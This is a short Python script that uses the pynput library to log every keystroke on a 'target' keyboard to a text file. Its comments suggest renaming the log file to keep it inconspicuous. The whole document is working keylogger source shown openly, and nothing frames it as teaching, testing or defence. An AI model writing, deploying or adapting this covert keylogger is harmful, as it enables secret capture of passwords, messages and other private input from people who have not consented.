from pynput.keyboard import Listener

# Path to log file can be changed to be more inconspicuous 
log_file = "key_log.txt"

# Function to write the target key stroke to key_log.txt
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like shift, enter, etc.
        with open(log_file, "a") as file:
            file.write(f" {key} ")

# Start listening on target keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
